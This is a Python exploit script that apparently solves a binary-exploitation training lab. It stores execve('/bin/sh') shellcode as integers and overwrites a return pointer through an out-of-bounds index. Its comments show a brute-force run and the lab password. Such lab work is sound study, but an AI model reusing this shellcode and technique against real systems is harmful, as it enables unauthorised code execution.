# Author: Abhinav Thakur
# Email : compilepeace@gmail.com
#
# shellcode source: shellcode/lab3A_numberic_hop.asm
#
# test:
# $ printf "store\x0a3221222732\x0a109\x0astore\x0a3435973836\x0a1\x0aread\x0a109\x0aread\x0a1\x0aquit\x0a" | strace /levels/lab03/lab3A
# 
# run:  
# $ for i in {3221222600..3221222900}; do (python exploit.py $i;cat) | /levels/lab03/lab3A; done
# ...
# whoami
# lab3end
# cat /home/lab3end/.pass
# sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps
#

import sys

ret_address = int(sys.argv[1])
numbers = [0x8950c031, 0x9005ebe2, 0x732f2f68,
           0x9005eb68, 0x69622f68, 0x9005eb6e,
           0x5350e389, 0x04ebe189, 0x80cd0bb0]

#0x31c05089, 0xe2eb0590, 0x682f2f73, 
#0x68eb0590, 0x682f6269, 0x6eeb0590,
#0x89e35389, 0xe1eb0590, 0xb00bcd80]

payload = ""
i = 0
for idx in range(1, 14):
    if (idx % 3 == 0):
        continue
    num = numbers[i]
    i += 1
    payload += "store\x0a{num}\x0a{idx}\x0a".format(num=num, idx=idx)

# overwriting return pointer
# data[1] = 0xbffff54c (3221222732) (inside gdb)
# &ret_ptr = 0xbffff6fc
# 0xbffff6fc - 0xbffff548 = 436 => 436/4 = 109 (index value)
payload += "store\x0a{num}\x0a{idx}\x0a".format(num=ret_address, idx=109)
payload += "quit\x0a"

print (payload)